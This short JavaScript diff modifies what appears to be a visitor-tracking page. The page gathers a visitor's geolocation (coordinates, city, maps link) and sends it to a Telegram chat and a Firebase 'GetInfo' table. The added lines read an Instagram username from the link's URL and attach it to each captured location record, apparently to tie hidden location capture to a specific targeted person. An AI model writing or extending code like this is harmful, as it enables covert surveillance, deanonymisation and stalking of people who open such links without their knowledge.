@@ -8,6 +8,8 @@ const firebaseConfig = {
   appId: "1:247603082330:web:e71b378a57133300109463",
 };
 
+var username = new URL(window.location.href).searchParams.get("username");
+
 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 let db = firebase.database();
@@ -36,6 +38,7 @@ const ajaxFunc = async (_data) => {
           getData.ll[0] +
           "," +
           getData.ll[1],
+        instagramKad : username,
       };
       // Object.assign(getAll, todayDate());
       sendMessageTelegram(
@@ -45,7 +48,8 @@ const ajaxFunc = async (_data) => {
           getAll.longitude,
           todayDate().dataIsGetDate,
           getAll.city,
-          getAll.mapsUrl
+          getAll.mapsUrl,
+          getAll.instagramKad
         )
       );
       insert("GetInfo", idKey, getAll);
